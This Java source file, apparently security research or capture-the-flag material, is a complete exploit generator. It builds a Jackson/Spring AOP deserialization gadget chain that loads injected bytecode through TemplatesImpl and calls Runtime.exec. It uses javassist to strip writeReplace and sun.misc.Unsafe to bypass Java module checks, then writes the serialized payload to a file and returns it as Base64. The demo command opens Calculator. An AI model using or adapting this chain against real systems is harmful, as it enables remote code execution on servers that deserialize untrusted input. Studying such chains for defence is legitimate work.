import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XObject;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.org.apache.xpath.internal.objects.XStringForFSB;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.misc.Unsafe;
import sun.reflect.ReflectionFactory;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Vector;


// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED  
public class SpringRCE {
    public static void main(String[] args) throws Exception {
        getB64Code();
    }

    public static String getB64Code() throws Exception {
        // 删除writeReplace保证正常反序列化
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            // 可以直接return
            writeReplace.setBody("return $0;");
            // 也可以修改方法名
            // writeReplace.setName("Replace");
            // 也可以直接删去这个类
            //ctClass.removeMethod(ctMethod);
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }

        // 把模块强行修改，切换成和目标类一样的 Module 对象
        ArrayList<Class> classes = new ArrayList<>();
        classes.add(TemplatesImpl.class);
        classes.add(POJONode.class);
        classes.add(EventListenerList.class);
        classes.add(SpringRCE.class);
        classes.add(Field.class);
        classes.add(Method.class);
        new SpringRCE().bypassModule(classes);

        // ===== EXP 构造 =====
        byte[] code1 = getTemplateCode();
        byte[] code2 = ClassPool.getDefault().makeClass("jackson17").toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "xxx");
        setFieldValue(templates, "_bytecodes", new byte[][]{code1, code2});
        setFieldValue(templates, "_transletIndex", 0);

        // setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));

        // EventListenerList eventListenerList = getEventListenerList(node);
        // // serialize(eventListenerList, true);
        // byte[] scode = serialize(eventListenerList, false);

        // HashMap m = getXString(node);
        HashMap m = getXString1(node);
        byte[] scode = serialize(m, false);

        Files.write(Paths.get("jackson.ser"), scode);
        return Base64.getEncoder().encodeToString(scode);
    }


    public static byte[] serialize(Object obj, boolean flag) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
        return baos.toByteArray();
    }


    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }


    public static byte[] getTemplateCode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");

        // // 采用静态初始化器 —— 只会执行一次
        // // String block = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        // String block = "Runtime.getRuntime().exec(\"touch \"+System.currentTimeMillis()+\"\");";
        // template.makeClassInitializer().insertBefore(block);
        // return template.toBytecode();

        // 在构造器中插入要每次执行的逻辑 —— 每次 new 都会执行
        CtConstructor ctor = new CtConstructor(new CtClass[0], template);
        String ctorBody = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        // String ctorBody = "Runtime.getRuntime().exec(\"touch \"+System.currentTimeMillis()+\"\");";
        ctor.setBody(ctorBody);
        template.addConstructor(ctor);
        // 导出字节码
        byte[] bytes = template.toBytecode();
        template.detach(); // 释放 CtClass 对象（防止内存/permgen 泄露）
        return bytes;
    }


    public static EventListenerList getEventListenerList(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager undomanager = new UndoManager();

        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。  
        Vector vector = (Vector) getFieldValue(undomanager, "edits");
        vector.add(obj);

        setFieldValue(list, "listenerList", new Object[]{Class.class, undomanager});
        return list;
    }
    public static HashMap getXString1(Object obj) throws Exception {
        XObject xString = new XString("foo");
        HashMap<Object, Object> map1    = new HashMap();
        HashMap<Object, Object> map2    = new HashMap();
        map1.put("yy", obj);
        map1.put("zZ", xString);
        map2.put("yy", xString);
        map2.put("zZ", obj);
        HashMap hashmap = makeMap(map1, map2);
        return hashmap;
    }

    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }


    // --add-opens java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED
    public static HashMap getXString(Object obj) throws Exception {
        // XString xString = new XString("foo");
        // XString xString = new XString("x");

        // Constructor<Object> objCons = Object.class.getDeclaredConstructor(new Class[0]);
        // objCons.setAccessible(true);
        // ClassLoader cl = Thread.currentThread().getContextClassLoader();
        // if (cl == null) cl = ClassLoader.getSystemClassLoader();
        // Class<?> targetClass = Class.forName(
        //         "com.sun.org.apache.xpath.internal.objects.XStringForFSB",
        //         false,
        //         cl
        // );
        // Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(targetClass, objCons);
        // sc.setAccessible(true);
        // Object xStringForFSB = sc.newInstance(new Object[0]);

        HashMap m = new HashMap();
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(m);
        // HotSwappableTargetSource v2 = new HotSwappableTargetSource(xfsb);
        // HotSwappableTargetSource v2 = new HotSwappableTargetSource(xStringForFSB);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));

        HashMap<Object, Object> list = new HashMap<Object, Object>();
        list.put(v1, v1);
        list.put(v2, v2);

        setFieldValue(v1, "target", obj);
        return list;
    }

    private static Method getMethod(Class clazz, String methodName, Class[]
            params) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, params);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private static Unsafe getUnsafe() {
        Unsafe unsafe = null;
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        return unsafe;
    }

    public void bypassModule(ArrayList<Class> classes) {
        try {
            Unsafe unsafe = getUnsafe();
            Class currentClass = this.getClass();
            try {
                Method getModuleMethod = getMethod(Class.class, "getModule", new
                        Class[0]);
                if (getModuleMethod != null) {
                    for (Class aClass : classes) {
                        Object targetModule = getModuleMethod.invoke(aClass, new
                                Object[]{});
                        unsafe.getAndSetObject(currentClass,
                                unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
                    }
                }
            } catch (Exception e) {
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = null;
        Class c = obj.getClass();
        for (int i = 0; i < 5; i++) {
            try {
                field = c.getDeclaredField(fieldName);
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        field.setAccessible(true);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        field.setAccessible(true);
        return field;
    }


    public static void setFieldValue(Object obj, String field, Object val) throws Exception {
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}